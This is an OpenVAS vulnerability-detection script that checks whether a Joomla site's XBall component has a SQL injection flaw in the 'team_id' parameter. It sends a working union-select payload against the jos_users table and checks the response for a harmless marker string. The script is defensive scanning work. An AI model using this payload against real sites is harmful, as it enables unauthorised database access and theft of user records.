##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_xball_sql_inj_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Joomla XBall Component SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let attackers to manipulate SQL
queries by injecting arbitrary SQL code.

Impact Level: Application";

tag_affected = "Joomla XBall Component";

tag_insight = "The flaw is due to an input passed via the 'team_id' parameter
to 'index.php' is not properly sanitised before being used in a SQL query.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla XBall component and is prone to
SQL injection vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802569");
  script_version("$Revision: 9352 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-01-23 15:38:16 +0530 (Mon, 23 Jan 2012)");
  script_name("Joomla XBall Component SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108954/joomlaxball-sql.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Get the port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directiory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct attack request
url = joomlaDir + "/index.php?option=com_xball&controller=teams&task=show&" +
                  "team_id=-98+union+select+0,1,2,3,4,group_concat" +
                  "(0x4f70656e564153,0x3a,0x4f70656e564153,0x3a),6,7,8,9," +
                  "10,11,12,13,14,15,16,17+from+jos_users";

## Check the response to confirm vulnerability
if(http_vuln_check(port:joomlaPort, url:url, pattern:"OpenVAS:OpenVAS")){
  security_message(joomlaPort);
}
